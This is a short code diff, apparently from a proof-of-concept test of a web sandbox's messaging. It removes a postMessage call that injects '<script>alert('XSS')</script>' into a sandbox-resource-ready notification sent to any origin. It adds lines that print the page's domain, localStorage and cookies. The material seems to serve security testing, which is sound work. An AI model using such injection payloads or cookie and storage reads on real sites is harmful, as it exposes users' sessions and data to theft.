@@ -1,6 +1,3 @@
-window.postMessage({
-  method: 'ui/notifications/sandbox-resource-ready',
-  params: {
-    html: "<script>alert('XSS')</script>"
-  }
-}, "*");
+console.log(document.domain);
+console.log(localStorage);
+console.log(document.cookie);
